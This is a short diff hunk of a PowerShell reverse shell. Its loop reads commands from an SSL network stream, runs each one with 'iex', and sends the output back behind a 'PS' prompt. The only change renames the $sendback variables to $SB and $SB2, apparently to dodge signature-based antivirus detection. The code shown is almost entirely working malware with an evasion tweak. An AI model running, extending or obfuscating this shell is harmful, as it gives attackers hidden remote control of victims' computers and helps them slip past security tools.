@@ -10,8 +10,8 @@ $Escribir.Write('PS ' + (pwd).Path + '> ')
 $Escribir.flush()
 while(($i = $SSL.Read($Bfr, 0, $Bfr.Length)) -ne 0)
 {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bfr,0, $i);
-$sendback = (iex $data | Out-String ) 2>&1;
-$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$SB = (iex $data | Out-String ) 2>&1;
+$SB2 = $SB + 'PS ' + (pwd).Path + '> ';
+$sendbyte = ([text.encoding]::ASCII).GetBytes($SB2);
 $SSL.Write($sendbyte,0,$sendbyte.Length);$SSL.Flush()}
 $Escribir.close();$servidor.close();
